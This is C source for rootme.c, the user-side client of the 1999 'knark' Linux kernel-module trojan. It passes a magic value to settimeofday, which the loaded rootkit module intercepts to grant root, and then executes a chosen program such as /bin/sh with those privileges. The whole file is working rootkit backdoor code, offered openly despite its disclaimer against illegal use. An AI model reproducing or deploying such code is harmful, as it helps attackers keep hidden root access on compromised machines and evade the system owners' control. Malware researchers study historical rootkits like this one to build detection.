/*
 * rootme.c, part of the knark package
 * Linux 2.1-2.2 lkm trojan user program
 * (c) Creed @ #hack.se 1999 <creed@sekure.net>
 * 
 * This program may NOT be used in an illegal way,
 * or to cause damage of any kind.
 * 
 * See README for more info.
 */

#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <time.h>

#include "knark.h"


void usage(const char *progname)
{
    fprintf(stderr,
	    "Usage:\n"
	    "\t%s <path> [args ...]\n"
	    "ex: %s /bin/sh\n",
	    progname, progname);
    exit(-1);
}


int main(int argc, char *argv[])
{
    author_banner("rootme.c");
    
    if(argc < 2)
	usage(argv[0]);
    
    if(settimeofday((struct timeval *)KNARK_GIMME_ROOT,
		    (struct timezone *)NULL) == -1)
    {
	perror("settimeofday");
	fprintf(stderr, "Have you really loaded knark.o?!\n");
	exit(-1);
    }
    
    printf("Do you feel lucky today, hax0r?\n");
    if(execv(argv[1], argv+1) == -1)
	perror("execv"), exit(-1);
    exit(0);
}
